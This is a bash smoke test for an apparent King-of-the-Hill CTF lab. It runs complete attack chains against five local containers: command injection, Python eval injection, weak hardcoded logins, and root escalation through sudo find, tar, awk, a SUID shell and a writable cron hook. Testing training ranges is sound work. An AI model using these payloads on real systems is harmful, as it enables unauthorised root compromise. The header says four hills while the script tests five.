#!/usr/bin/env bash
# Smoke test of ALL 4 hills: full chain attack->user->root->king + reset (revives the vuln).
# Requires the containers running (docker compose up in each deploy/hills/*).
# Returns non-zero on any FAIL.
set -uo pipefail
TOKEN="TOK-RED-7f3a9c"
PASS=0; FAIL=0
ok(){ if [ "$1" = "$2" ]; then echo "  PASS $3"; PASS=$((PASS+1)); else echo "  FAIL $3 (got: [$1] exp: [$2])"; FAIL=$((FAIL+1)); fi; }
has(){ if echo "$1" | grep -q "$2"; then echo "  PASS $3"; PASS=$((PASS+1)); else echo "  FAIL $3 (got: [$1])"; FAIL=$((FAIL+1)); fi; }

# ---- per-hill attack extractors (echo user; echo root; echo king_readback) ----
h1_user(){ curl -s -G http://127.0.0.1:8081/ping --data-urlencode "host=x; cat /home/www/user.txt" | grep -o 'CTF{[^}]*}'; }
h1_root(){ curl -s -G http://127.0.0.1:8081/ping --data-urlencode 'host=x; sudo find /etc/hostname -exec cat /root/root.txt \;' | grep -o 'CTF{[^}]*}'; }
h1_king(){ curl -s -G http://127.0.0.1:8081/ping --data-urlencode "host=x; sudo find /etc/hostname -exec sh -c \"echo $TOKEN > /root/king.txt\" \;" >/dev/null;
           curl -s -G http://127.0.0.1:8081/ping --data-urlencode 'host=x; sudo find /etc/hostname -exec cat /root/king.txt \;' | grep -o 'TOK-[A-Za-z0-9-]*'; }

h2_user(){ curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['cat','/home/www/user.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h2_root(){ curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['/usr/local/bin/rootbash','-p','-c','cat /root/root.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h2_king(){ curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['/usr/local/bin/rootbash','-p','-c','echo $TOKEN > /root/king.txt'],capture_output=True,text=True).stdout" >/dev/null;
           curl -s -G http://127.0.0.1:8082/calc --data-urlencode "expr=__import__('subprocess').run(['/usr/local/bin/rootbash','-p','-c','cat /root/king.txt'],capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }

h3_login(){ curl -s -c /tmp/h3jar -o /dev/null -d 'user=admin&password=monkey123' http://127.0.0.1:8083/login; }
h3_user(){ h3_login; curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=cat /home/svc/user.txt" | grep -o 'CTF{[^}]*}'; }
h3_root(){ h3_login; curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=echo 'cat /root/root.txt > /tmp/pwn; chmod 644 /tmp/pwn' > /opt/hook.sh" >/dev/null; sleep 4;
           curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=cat /tmp/pwn" | grep -o 'CTF{[^}]*}'; }
h3_king(){ h3_login; curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=echo 'echo $TOKEN > /root/king.txt' > /opt/hook.sh" >/dev/null; sleep 4;
           curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=echo 'cat /root/king.txt > /tmp/k; chmod 644 /tmp/k' > /opt/hook.sh" >/dev/null; sleep 4;
           curl -s -b /tmp/h3jar -G http://127.0.0.1:8083/run --data-urlencode "cmd=cat /tmp/k" | grep -o 'TOK-[A-Za-z0-9-]*'; }

h4_user(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(['cat','/home/jenkins/user.txt'],capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h4_root(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/root.txt'\",shell=True,capture_output=True,text=True).stdout" | grep -o 'CTF{[^}]*}'; }
h4_king(){ curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='sh -c \\\"echo $TOKEN > /root/king.txt\\\"'\",shell=True,capture_output=True,text=True).stdout" >/dev/null;
           curl -s -u admin:admin -G http://127.0.0.1:8084/script --data-urlencode "expr=__import__('subprocess').run(\"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='cat /root/king.txt'\",shell=True,capture_output=True,text=True).stdout" | grep -o 'TOK-[A-Za-z0-9-]*'; }

h5_user(){ curl -s -G http://127.0.0.1:8085/replay --data-urlencode "match=x; cat /home/arena/user.txt" | grep -o 'CTF{[^}]*}'; }
h5_root(){ curl -s -G http://127.0.0.1:8085/replay --data-urlencode "match=x; sudo awk 'BEGIN{system(\"cat /root/root.txt\")}'" | grep -o 'CTF{[^}]*}'; }
h5_king(){ curl -s -G http://127.0.0.1:8085/replay --data-urlencode "match=x; sudo awk 'BEGIN{system(\"echo $TOKEN > /root/king.txt\")}'" >/dev/null;
           curl -s -G http://127.0.0.1:8085/replay --data-urlencode "match=x; sudo awk 'BEGIN{system(\"cat /root/king.txt\")}'" | grep -o 'TOK-[A-Za-z0-9-]*'; }

uf(){ case "$1" in
  1) echo 'CTF{w3b_rc3_1gn1t10n_f00th0ld}';; 2) echo 'CTF{drup4lg3dd0n2_unauth_rce}';;
  3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';;
  5) echo 'CTF{h4ckw4rs_c0mm4nd_1nj3ct10n_f00th0ld}';; esac; }
rf(){ case "$1" in
  1) echo 'CTF{l4r4v3l_sud0_gtf0b1ns_r00t}';; 2) echo 'CTF{su1d_b1t_pr1v3sc_on_h0st}';;
  3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';;
  5) echo 'CTF{h4ckw4rs_sud0_awk_gtf0b1ns_r00t}';; esac; }

for n in 1 2 3 4 5; do
  echo "=== hill-$n ==="
  ok "$(h${n}_user)" "$(uf $n)" "hill-$n user flag (foothold)"
  ok "$(h${n}_root)" "$(rf $n)" "hill-$n root flag (privesc)"
  ok "$(h${n}_king)" "$TOKEN"   "hill-$n write king.txt (take the hill)"
done

echo "=== reset revives the vuln (defense breaks privesc -> reset restores it) ==="
# hill-1: remove sudoers
docker exec koth-hill-1 rm -f /etc/sudoers.d/www 2>/dev/null
r=$(h1_root); [ -z "$r" ] && { echo "  PASS hill-1 privesc blocked after removing sudoers"; PASS=$((PASS+1)); } || { echo "  FAIL hill-1 (still works: $r)"; FAIL=$((FAIL+1)); }
docker exec koth-hill-1 /opt/app/reset.sh >/dev/null 2>&1
ok "$(h1_root)" "$(rf 1)" "hill-1 privesc works after reset"
# hill-2: strip SUID
docker exec koth-hill-2 chmod 0755 /usr/local/bin/rootbash 2>/dev/null
docker exec koth-hill-2 /opt/app/reset.sh >/dev/null 2>&1
ok "$(h2_root)" "$(rf 2)" "hill-2 SUID privesc works after reset"
# hill-4: remove sudoers
docker exec koth-hill-4 rm -f /etc/sudoers.d/jenkins 2>/dev/null
docker exec koth-hill-4 /opt/app/reset.sh >/dev/null 2>&1
ok "$(h4_root)" "$(rf 4)" "hill-4 sudo/tar privesc works after reset"
# hill-5: remove sudoers
docker exec koth-hill-5 rm -f /etc/sudoers.d/arena 2>/dev/null
r=$(h5_root); [ -z "$r" ] && { echo "  PASS hill-5 privesc blocked after removing sudoers"; PASS=$((PASS+1)); } || { echo "  FAIL hill-5 (still works: $r)"; FAIL=$((FAIL+1)); }
docker exec koth-hill-5 /opt/app/reset.sh >/dev/null 2>&1
ok "$(h5_root)" "$(rf 5)" "hill-5 sudo/awk privesc works after reset"

echo "=== SMOKE: $PASS PASS / $FAIL FAIL ==="
[ "$FAIL" -eq 0 ]
